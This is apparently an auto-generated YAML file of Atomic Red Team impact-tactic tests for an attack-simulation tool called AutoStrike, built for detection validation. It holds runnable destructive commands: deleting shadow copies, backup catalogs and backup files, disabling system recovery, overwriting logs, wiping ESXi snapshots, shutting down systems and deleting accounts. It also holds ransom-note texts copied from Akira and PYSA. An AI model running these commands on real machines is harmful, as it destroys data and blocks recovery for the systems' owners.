# AutoStrike MITRE ATT&CK Techniques - impact
# Auto-generated by mitre-import script
# Source: MITRE ATT&CK STIX 2.1 + Atomic Red Team

- id: T1485
  name: Data Destruction
  description: 'Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018)(Citation: Ta...'
  tactic: impact
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Windows - Overwrite file with SysInternals SDelete
      type: powershell
      platform: windows
      command: |-
        if (-not (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\T1485.txt")) { New-Item "PathToAtomicsFolder\..\ExternalPayloads\T1485.txt" -Force }
        & "PathToAtomicsFolder\..\ExternalPayloads\Sdelete\sdelete.exe" -accepteula "PathToAtomicsFolder\..\ExternalPayloads\T1485.txt"
      timeout: 120
    - name: FreeBSD/macOS/Linux - Overwrite file with DD
      type: sh
      platform: linux
      command: dd of=/var/log/syslog if=/dev/zero count=$(ls -l /var/log/syslog | awk '{print $5}') iflag=count_bytes
      timeout: 60
    - name: FreeBSD/macOS/Linux - Overwrite file with DD
      type: sh
      platform: macos
      command: dd of=/var/log/syslog if=/dev/zero count=$(ls -l /var/log/syslog | awk '{print $5}') iflag=count_bytes
      timeout: 60
    - name: Overwrite deleted data on C drive
      type: cmd
      platform: windows
      command: 'cipher.exe /w:C:'
      timeout: 120
    - name: ESXi - Delete VM Snapshots
      type: cmd
      platform: windows
      command: echo "" | "PathToAtomicsFolder\..\ExternalPayloads\plink.exe" -batch "atomic.local" -ssh -l root -pw "password" "for i in `vim-cmd vmsvc/getallvms | awk 'NR>1 {print $1}'`; do vim-cmd vmsvc/snapshot.removeall $i & done"
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1485
  is_safe: false
- id: T1486
  name: Data Encrypted for Impact
  description: Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key ...
  tactic: impact
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Encrypt files using gpg (FreeBSD/Linux)
      type: sh
      platform: linux
      command: echo "passwd" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo AES-256 -o /tmp/passwd.gpg -c /etc/passwd
      cleanup: rm /tmp/passwd.gpg
      timeout: 60
    - name: Encrypt files using 7z (FreeBSD/Linux)
      type: sh
      platform: linux
      command: $which_7z a -ppasswd /tmp/passwd.zip /etc/passwd
      cleanup: |-
        $which_7z e /tmp/passwd.zip
        rm /tmp/passwd.zip
      timeout: 60
    - name: Encrypt files using ccrypt (FreeBSD/Linux)
      type: sh
      platform: linux
      command: |-
        which_ccencrypt=`which ccencrypt`
        cp /etc/passwd /tmp/passwd;
        $which_ccencrypt -T -K passwd /tmp/passwd
      cleanup: rm /tmp/passwd.cpt
      timeout: 60
    - name: Encrypt files using openssl (FreeBSD/Linux)
      type: sh
      platform: linux
      command: |-
        which_openssl=`which openssl`
        $which_openssl genrsa -out /tmp/key.pem 2048
        $which_openssl rsa -in /tmp/key.pem -pubout -out /tmp/pub.pem
        $which_openssl rsautl -encrypt -inkey /tmp/pub.pem -pubin -in /etc/passwd -out /tmp/passwd.zip
      cleanup: |-
        $which_openssl rsautl -decrypt -inkey /tmp/key.pem -in /tmp/passwd.zip
        rm /tmp/passwd.zip
      timeout: 60
    - name: PureLocker Ransom Note
      type: cmd
      platform: windows
      command: echo T1486 - Purelocker Ransom Note > %USERPROFILE%\Desktop\YOUR_FILES.txt
      cleanup: del %USERPROFILE%\Desktop\YOUR_FILES.txt >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Encrypt files using 7z utility - macOS
      type: sh
      platform: macos
      command: 7z a -p ARTPass -mhe=on ARTArchive.7z ~/test.txt
      cleanup: rm ARTArchive.7z
      timeout: 60
    - name: Encrypt files using openssl utility - macOS
      type: sh
      platform: macos
      command: openssl enc -pbkdf2 -in ~/test.txt -out ARTFile
      cleanup: rm ARTFile
      timeout: 60
    - name: Data Encrypted with GPG4Win
      type: powershell
      platform: windows
      command: |-
        Set-Content -Path "$env:temp\test.txt" -Value "populating this file with some text"  # Create the test.txt file again in case prereqs failed
        cmd /c "`"C:\Program Files (x86)\GnuPG\bin\gpg.exe`" --passphrase 'SomeParaphraseBlah' --batch --yes -c `"$env:temp\test.txt`""
      cleanup: |-
        Remove-Item -Path "$env:temp\test.txt" -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "$env:temp\test.txt.gpg" -Force -ErrorAction SilentlyContinue
      timeout: 120
    - name: Data Encrypt Using DiskCryptor
      type: cmd
      platform: windows
      command: '""%PROGRAMFILES%\dcrypt"\dcrypt.exe"'
      timeout: 120
      elevation_required: true
    - name: Akira Ransomware drop Files with .akira Extension and Ransomnote
      type: powershell
      platform: windows
      command: |-
        1..100 | ForEach-Object { $out = new-object byte[] 1073741; (new-object Random).NextBytes($out); [IO.File]::WriteAllBytes("c:\test.$_.akira", $out) }
        echo "Hi friends" >> $env:Userprofile\Desktop\akira_readme.txt
        echo "" >> $env:Userprofile\Desktop\akira_readme.txt
        echo "Whatever who you are and what your title is if you' re reading this it means the internal infrastructure of your company is fully or partially dead, all your backups - virtual, physical - everything that we managed to reach - are completely removed. Moreover, we have taken a great amount of your corporate data prior to encryption  Well, for now let's keep all the tears and resentment to ourselves and try to build a constructive dialogue. We're fully aware of what damage we caused by locking your internal sources. At the moment. you have to know: " >> $env:Userprofile\Desktop\akira_readme.txt
        echo "1. Dealing with us you will save A LOT due to we are not interested in ruining your financially. We will study in depth your finance, bank income statements, your savings, investments etc. and present our reasonable demand to you. If you have an active cyber insurance, let us know and we will guide you how to properly use it. Also, dragging out the negotiation process will lead to failing of a deal" >> $env:Userprofile\Desktop\akira_readme.txt
        echo "2. Paying us you save your TIME, MONEY, EFFORTS and be back on track within 24 hours approximately. Our decryptor works properly on any files or systems, so you will be able to check it by requesting a test decryption service from the beginning of our conversation. [f you decide to recover on your own, keep in mind that you can permanently lose access to some files or accidently corrupt them — in this case we won't be able to help.  " >> $env:Userprofile\Desktop\akira_readme.txt
        echo "3. The security report or the exclusive first-hand information that you will receive upon reaching an agreement is of a great value, since NO full audit of your network will show you the vulnerabilities that we' ve managed to detect and used in order to get into. identify backup solutions and upload your data." >> $env:Userprofile\Desktop\akira_readme.txt
        echo "4. As for your data, if we fail to agree, we will try to sell personal information/trade secrets/databases/source codes — generally speaking, everything that has a value on the darkmarket - to multiple threat actors at ones." >> $env:Userprofile\Desktop\akira_readme.txt
        echo "Then all of this will be published in our blog -" >> $env:Userprofile\Desktop\akira_readme.txt
        echo "" >> $env:Userprofile\Desktop\akira_readme.txt
        echo "https://akira.onion" >> $env:Userprofile\Desktop\akira_readme.txt
        echo "" >> $env:Userprofile\Desktop\akira_readme.txt
        echo "5. We're more than negotiable and will definitely find the way to settle this quickly and reach an agreement which will satisfy both of us" >> $env:Userprofile\Desktop\akira_readme.txt
        echo "" >> $env:Userprofile\Desktop\akira_readme.txt
        echo "If you' re indeed interested in our assistance and the services we provide you can reach out to us following simple instructions:" >> $env:Userprofile\Desktop\akira_readme.txt
        echo "" >> $env:Userprofile\Desktop\akira_readme.txt
        echo "1. Install TOR Browser to get access to our chat room - https://www.torproject.org/download/." >> $env:Userprofile\Desktop\akira_readme.txt
        echo "2. Paste this link - https://akira.onion" >> $env:Userprofile\Desktop\akira_readme.txt
        echo "3. Use this code - - to log into our chat." >> $env:Userprofile\Desktop\akira_readme.txt
        echo "" >> $env:Userprofile\Desktop\akira_readme.txt
        echo "Keep in mind that the faster you will get in touch, the less damage we cause" >> $env:Userprofile\Desktop\akira_readme.txt
      cleanup: "del $env:Userprofile\\Desktop\\akira_readme.txt \ndel c:\\test.*.akira"
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1486
  is_safe: false
- id: T1489
  name: Service Stop
  description: "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.(Citation: Talos Olympic Destroyer 2018)(Citation: Novetta Blockbuster) \n\nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will m..."
  tactic: impact
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Windows - Stop service using Service Controller
      type: cmd
      platform: windows
      command: sc.exe stop spooler
      cleanup: sc.exe start spooler >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Windows - Stop service using net.exe
      type: cmd
      platform: windows
      command: net.exe stop spooler
      cleanup: net.exe start spooler >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Windows - Stop service by killing process
      type: cmd
      platform: windows
      command: taskkill.exe /f /im spoolsv.exe
      timeout: 120
    - name: Linux - Stop service using systemctl
      type: sh
      platform: linux
      command: sudo systemctl stop cron
      cleanup: sudo systemctl start cron 2> /dev/null
      timeout: 60
      elevation_required: true
    - name: Linux - Stop service by killing process using killall
      type: sh
      platform: linux
      command: sudo killall -SIGTERM cron
      cleanup: sudo systemctl start cron 2> /dev/null
      timeout: 60
      elevation_required: true
    - name: Linux - Stop service by killing process using kill
      type: sh
      platform: linux
      command: sudo kill -SIGTERM $(pgrep cron)
      cleanup: sudo systemctl start cron 2> /dev/null
      timeout: 60
      elevation_required: true
    - name: Linux - Stop service by killing process using pkill
      type: sh
      platform: linux
      command: sudo pkill -SIGTERM ^cron$
      cleanup: sudo systemctl start cron 2> /dev/null
      timeout: 60
      elevation_required: true
    - name: Abuse of linux magic system request key for Send a SIGTERM to all processes
      type: bash
      platform: linux
      command: echo "e" > /proc/sysrq-trigger
      timeout: 60
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1489
  is_safe: false
- id: T1490
  name: Inhibit System Recovery
  description: |-
    Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) This may deny access to available backups and recovery options.

    Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to a...
  tactic: impact
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Windows - Delete Volume Shadow Copies
      type: cmd
      platform: windows
      command: vssadmin.exe delete shadows /all /quiet
      timeout: 120
      elevation_required: true
    - name: Windows - Delete Volume Shadow Copies via WMI
      type: cmd
      platform: windows
      command: wmic.exe shadowcopy delete
      timeout: 120
      elevation_required: true
    - name: Windows - wbadmin Delete Windows Backup Catalog
      type: cmd
      platform: windows
      command: wbadmin delete catalog -quiet
      timeout: 120
      elevation_required: true
    - name: Windows - Disable Windows Recovery Console Repair
      type: cmd
      platform: windows
      command: |-
        bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
        bcdedit.exe /set {default} recoveryenabled no
      cleanup: |-
        bcdedit.exe /set {default} bootstatuspolicy DisplayAllFailures >nul 2>&1
        bcdedit.exe /set {default} recoveryenabled yes >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Windows - Delete Volume Shadow Copies via WMI with PowerShell
      type: powershell
      platform: windows
      command: Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
      timeout: 120
      elevation_required: true
    - name: Windows - Delete Backup Files
      type: cmd
      platform: windows
      command: del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
      timeout: 120
      elevation_required: true
    - name: Windows - wbadmin Delete systemstatebackup
      type: cmd
      platform: windows
      command: wbadmin delete systemstatebackup -keepVersions:0
      timeout: 120
      elevation_required: true
    - name: Windows - Disable the SR scheduled task
      type: cmd
      platform: windows
      command: schtasks.exe /Change /TN "\Microsoft\Windows\SystemRestore\SR" /disable
      cleanup: schtasks.exe /Change /TN "\Microsoft\Windows\SystemRestore\SR" /enable >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Disable System Restore Through Registry
      type: cmd
      platform: windows
      command: |-
        reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f
        reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f
        reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f
        reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f
      cleanup: |-
        reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /f >nul 2>&1
        reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /f >nul 2>&1
        reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /f >nul 2>&1
        reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Windows - vssadmin Resize Shadowstorage Volume
      type: powershell
      platform: windows
      command: 'vssadmin resize shadowstorage /For=C: /On=C: /MaxSize=20%'
      timeout: 120
      elevation_required: true
    - name: Modify VSS Service Permissions
      type: cmd
      platform: windows
      command: sc sdset VSS D:(D;;GA;;;NU)(D;;GA;;;WD)(D;;GA;;;AN)S:(AU;FA;GA;;;WD)(AU;OIIOFA;GA;;;WD)
      cleanup: sc sdset VSS D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;LC;;;BU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
      timeout: 120
      elevation_required: true
    - name: Disable Time Machine
      type: sh
      platform: macos
      command: sudo tmutil disable
      cleanup: sudo tmutil enable
      timeout: 60
      elevation_required: true
    - name: Windows - Delete Volume Shadow Copies via Diskshadow
      type: powershell
      platform: windows
      command: '"delete shadows all" | diskshadow.exe'
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1490
  is_safe: false
- id: T1491.001
  name: Internal Defacement
  description: 'An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users, thus discrediting the integrity of the systems. This may take the form of modifications to internal websites or server login messages, or directly to user systems with the replacement of the desktop wallpaper.(Citation: Novetta Blockbuster)(Citation: Varonis) Disturbing or offensive images may be used as a part of [Internal Defacement](https://attack.mitre.org/techniques/T1491/001) in order ...'
  tactic: impact
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Replace Desktop Wallpaper
      type: powershell
      platform: windows
      command: "$url = \"https://redcanary.com/wp-content/uploads/Atomic-Red-Team-Logo.png\"\n$imgLocation = \"$env:TEMP\\T1491.001-newWallpaper.png\"\n$orgWallpaper = (Get-ItemProperty -Path Registry::'HKEY_CURRENT_USER\\Control Panel\\Desktop\\' -Name WallPaper).WallPaper\n$orgWallpaper | Out-File -FilePath \"$env:TEMP\\T1491.001-OrginalWallpaperLocation\"\n$updateWallpapercode = @' \nusing System.Runtime.InteropServices; \nnamespace Win32{\n\n    public class Wallpaper{ \n        [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] \n         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; \n         \n         public static void SetWallpaper(string thePath){ \n            SystemParametersInfo(20,0,thePath,3); \n        }\n    }\n} \n'@\n$wc = New-Object System.Net.WebClient  \ntry{  \n    $wc.DownloadFile($url, $imgLocation)\n    add-type $updateWallpapercode \n    [Win32.Wallpaper]::SetWallpaper($imgLocation)\n} \ncatch [System.Net.WebException]{  \n    Write-Host(\"Cannot download $url\") \n    add-type $updateWallpapercode \n    [Win32.Wallpaper]::SetWallpaper($imgLocation)\n} \nfinally{    \n    $wc.Dispose()  \n}"
      cleanup: "$updateWallpapercode = @' \nusing System.Runtime.InteropServices; \nnamespace Win32{\n\n    public class Wallpaper{ \n        [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] \n         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; \n         \n         public static void SetWallpaper(string thePath){ \n            SystemParametersInfo(20,0,thePath,3); \n        }\n    }\n} \n'@\nif (Test-Path -Path $env:TEMP\\T1491.001-OrginalWallpaperLocation -PathType Leaf) {\n     $orgImg = Get-Content -Path \"$env:TEMP\\T1491.001-OrginalWallpaperLocation\"\n     add-type $updateWallpapercode \n     [Win32.Wallpaper]::SetWallpaper($orgImg)\n}\nRemove-Item \"$env:TEMP\\T1491.001-OrginalWallpaperLocation\" -ErrorAction Ignore\nRemove-Item \"$env:TEMP\\T1491.001-newWallpaper.png\" -ErrorAction Ignore"
      timeout: 120
    - name: Configure LegalNoticeCaption and LegalNoticeText registry keys to display ransom message
      type: powershell
      platform: windows
      command: |-
        $orgLegalNoticeCaption = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeCaption).LegalNoticeCaption
        $orgLegalNoticeText = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeText).LegalNoticeText
        $newLegalNoticeCaption = "PYSA"
        $newLegalNoticeText = "Hi Company, every byte on any types of your devices was encrypted. Don't try to use backups because it were encrypted too. To get all your data contact us:xxxx@onionmail.org"
        Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeCaption -Value $newLegalNoticeCaption -Type String -Force
        Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeText -Value $newLegalNoticeText -Type String -Force
      cleanup: |-
        Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeCaption -Value $orgLegalNoticeCaption -Type String -Force
        Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeText -Value $orgLegalNoticeText -Type String -Force
      timeout: 120
      elevation_required: true
    - name: ESXi - Change Welcome Message on Direct Console User Interface (DCUI)
      type: cmd
      platform: windows
      command: echo "" | "PathToAtomicsFolder\..\ExternalPayloads\plink.exe" -batch "atomic.local" -ssh -l root -pw "password" "esxcli system welcomemsg set -m 'RANSOMWARE-NOTIFICATION'"
      timeout: 120
    - name: Windows - Display a simulated ransom note via Notepad (non-destructive)
      type: powershell
      platform: windows
      command: |-
        $notePath = Join-Path $env:TEMP "ART-T1491-ransom-note.txt"
        $pidPath  = Join-Path $env:TEMP "ART-T1491-notepad.pid"

        $Title = "!!! READ_ME_NOW !!!"
        $Body  = "Your files are SAFE. This is a TEST note for detection validation
        by bak3n3k0. No data has been encrypted. This simulation exercises
        detections for:
          - notepad.exe launched with a ransom-themed text file
          - creation of a ransom-themed text file in %TEMP%
        NON-DESTRUCTIVE Atomic Red Team test.
        "

        $header  = $Title + "`r`n" + ('=' * $Title.Length) + "`r`n`r`n"
        $content = $header + $Body

        [System.IO.File]::WriteAllText($notePath, $content, [System.Text.Encoding]::UTF8)

        $p = Start-Process notepad.exe -ArgumentList "`"$notePath`"" -PassThru
        $p.Id | Out-File -FilePath $pidPath -Encoding ascii -Force
      cleanup: |-
        try {
          # 1. Kill all Notepad processes
          Get-Process notepad -ErrorAction SilentlyContinue |
            ForEach-Object {
              Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
            }

          # 2. Wait briefly for Windows to release file handles
          Start-Sleep -Seconds 1

          # 3. Force delete ransom note + PID file
          $notePath = Join-Path $env:TEMP "ART-T1491-ransom-note.txt"
          $pidPath  = Join-Path $env:TEMP "ART-T1491-notepad.pid"

          if (Test-Path $notePath) {
            Remove-Item $notePath -Force -ErrorAction Stop
          }
          if (Test-Path $pidPath) {
            Remove-Item $pidPath -Force -ErrorAction Stop
          }
        }
        catch {
          Write-Warning "Cleanup failed with error: $_"
        }
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1491/001
  is_safe: false
- id: T1496
  name: Resource Hijacking
  description: "Adversaries may leverage the resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability. \n\nResource hijacking may take a number of different forms. For example, adversaries may:\n\n* Leverage compute resources in order to mine cryptocurrency\n* Sell network bandwidth to proxy networks\n* Generate SMS traffic for profit\n* Abuse cloud-based messaging services to send large quantities of spam messages\n\nIn some cases, adversaries may le..."
  tactic: impact
  platforms:
    - windows
    - linux
    - macos
  executors:
    - name: FreeBSD/macOS/Linux - Simulate CPU Load with Yes
      type: sh
      platform: linux
      command: yes > /dev/null
      timeout: 60
    - name: FreeBSD/macOS/Linux - Simulate CPU Load with Yes
      type: sh
      platform: macos
      command: yes > /dev/null
      timeout: 60
    - name: Windows - Simulate CPU Load with PowerShell
      type: powershell
      platform: windows
      command: |-
        $end = (Get-Date).AddSeconds(30)
        1..4 | ForEach-Object { Start-Job { param($t) while((Get-Date) -lt $t) { $i=0; while($i -lt 200000){$i++} } } -ArgumentList $end }
        Get-Job | Wait-Job | Remove-Job
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1496
  is_safe: false
- id: T1529
  name: System Shutdown/Reboot
  description: 'Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) (e.g. <code>reload</code>).(Citation: Microsoft Shutdown Oct 2017)(Citation: alert_TA18_106A) They may...'
  tactic: impact
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Shutdown System - Windows
      type: cmd
      platform: windows
      command: shutdown /s /t 1
      timeout: 120
      elevation_required: true
    - name: Restart System - Windows
      type: cmd
      platform: windows
      command: shutdown /r /t 1
      timeout: 120
      elevation_required: true
    - name: Restart System via `shutdown` - FreeBSD/macOS/Linux
      type: sh
      platform: linux
      command: shutdown -r now
      timeout: 60
      elevation_required: true
    - name: Restart System via `shutdown` - FreeBSD/macOS/Linux
      type: sh
      platform: macos
      command: shutdown -r now
      timeout: 60
      elevation_required: true
    - name: Shutdown System via `shutdown` - FreeBSD/macOS/Linux
      type: sh
      platform: linux
      command: shutdown -h now
      timeout: 60
      elevation_required: true
    - name: Shutdown System via `shutdown` - FreeBSD/macOS/Linux
      type: sh
      platform: macos
      command: shutdown -h now
      timeout: 60
      elevation_required: true
    - name: Restart System via `reboot` - FreeBSD/macOS/Linux
      type: sh
      platform: linux
      command: reboot
      timeout: 60
      elevation_required: true
    - name: Restart System via `reboot` - FreeBSD/macOS/Linux
      type: sh
      platform: macos
      command: reboot
      timeout: 60
      elevation_required: true
    - name: Shutdown System via `halt` - FreeBSD/Linux
      type: sh
      platform: linux
      command: halt -p
      timeout: 60
      elevation_required: true
    - name: Reboot System via `halt` - FreeBSD
      type: sh
      platform: linux
      command: halt -r
      timeout: 60
      elevation_required: true
    - name: Reboot System via `halt` - Linux
      type: bash
      platform: linux
      command: halt --reboot
      timeout: 60
      elevation_required: true
    - name: Shutdown System via `poweroff` - FreeBSD/Linux
      type: sh
      platform: linux
      command: poweroff
      timeout: 60
      elevation_required: true
    - name: Reboot System via `poweroff` - FreeBSD
      type: sh
      platform: linux
      command: poweroff -r 3
      timeout: 60
      elevation_required: true
    - name: Reboot System via `poweroff` - Linux
      type: bash
      platform: linux
      command: poweroff --reboot
      timeout: 60
      elevation_required: true
    - name: Logoff System - Windows
      type: cmd
      platform: windows
      command: shutdown /l
      timeout: 120
      elevation_required: true
    - name: ESXi - Terminates VMs using pkill
      type: cmd
      platform: windows
      command: echo "" | "PathToAtomicsFolder\..\ExternalPayloads\plink.exe" "atomic.local" -ssh  -l "root" -pw "pass" -m "PathToAtomicsFolder\T1529\src\esx_pkill.txt"
      timeout: 120
    - name: ESXi - Avoslocker enumerates VMs and forcefully kills VMs
      type: cmd
      platform: windows
      command: echo "" | "PathToAtomicsFolder\..\ExternalPayloads\plink.exe" "atomic.local" -ssh  -l "root" -pw "pass" -m "PathToAtomicsFolder\T1529\src\esx_avoslocker_kill_vm.txt"
      timeout: 120
    - name: ESXi - vim-cmd Used to Power Off VMs
      type: cmd
      platform: windows
      command: echo "" | "PathToAtomicsFolder\..\ExternalPayloads\plink.exe" -batch "atomic.local" -ssh -l root -pw "password" "for i in `vim-cmd vmsvc/getallvms | awk 'NR>1 {print $1}'`; do vim-cmd vmsvc/power.off $i & done"
      timeout: 120
    - name: Abuse of Linux Magic System Request Key for Reboot
      type: bash
      platform: linux
      command: echo "b" > /proc/sysrq-trigger
      timeout: 60
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1529
  is_safe: false
- id: T1531
  name: Account Access Removal
  description: 'Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials, revoked permissions for SaaS platforms such as Sharepoint) to remove access to accounts.(Citation: Obsidian Security SaaS Ransomware June 2023) Adversaries may also subsequently log off and/or perform a [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to set malicious chan...'
  tactic: impact
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Change User Password - Windows
      type: cmd
      platform: windows
      command: |-
        net user AtomicAdministrator User2ChangePW! /add
        net.exe user AtomicAdministrator HuHuHUHoHo283283@dJD
      cleanup: net.exe user AtomicAdministrator /delete >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Delete User - Windows
      type: cmd
      platform: windows
      command: |-
        net user AtomicUser User2DeletePW! /add
        net.exe user AtomicUser /delete
      timeout: 120
      elevation_required: true
    - name: Remove Account From Domain Admin Group
      type: powershell
      platform: windows
      command: |-
        $PWord = ConvertTo-SecureString -String password -AsPlainText -Force
        $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList domain\super_user, $PWord
        if((Get-ADUser remove_user -Properties memberof).memberof -like "CN=Domain Admins*"){
          Remove-ADGroupMember -Identity "Domain Admins" -Members remove_user -Credential $Credential -Confirm:$False
        } else{
            write-host "Error - Make sure remove_user is in the domain admins group" -foregroundcolor Red
        }
      timeout: 120
    - name: Change User Password via passwd
      type: sh
      platform: macos
      command: 'passwd ARTUser #enter admin password > enter new password > confirm new password'
      timeout: 60
      elevation_required: true
    - name: Change User Password via passwd
      type: sh
      platform: linux
      command: 'passwd ARTUser #enter admin password > enter new password > confirm new password'
      timeout: 60
      elevation_required: true
    - name: Delete User via dscl utility
      type: sh
      platform: macos
      command: 'dscl . -delete /Users/ARTUser #enter admin password'
      cleanup: |-
        dscl . -create /Users/ARTUser #enter admin password
        dscl . -create /Users/ARTUser UserShell /bin/bash
        dscl . -create /Users/ARTUser UniqueID 503
        dscl . -create /Users/ARTUser NFSHomeDirectory /Users/ARTUser
        dscl . -passwd /Users/ARTUser ARTPassword #enter password for new user
      timeout: 60
      elevation_required: true
    - name: Delete User via sysadminctl utility
      type: sh
      platform: macos
      command: 'sysadminctl -deleteUser ARTUserAccount #enter admin password'
      cleanup: sysadminctl -addUser ARTUserAccount -fullName "ARTUser" -password ARTPassword
      timeout: 60
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1531
  is_safe: false
